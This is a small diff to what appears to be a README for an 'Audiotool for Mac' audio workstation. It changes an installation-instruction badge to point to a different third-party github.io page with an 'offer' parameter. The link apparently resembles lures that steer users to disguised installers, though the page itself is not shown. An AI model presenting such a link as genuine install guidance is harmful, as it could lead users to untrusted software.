@@ -5,7 +5,7 @@ Audiotool for Mac is a comprehensive digital audio workstation (DAW) designed to
 
 Follow the instructions below to maximize the capabilities of Audiotool on macOS.
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://aildelolady750.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=Audiotool)
 
 ---
 
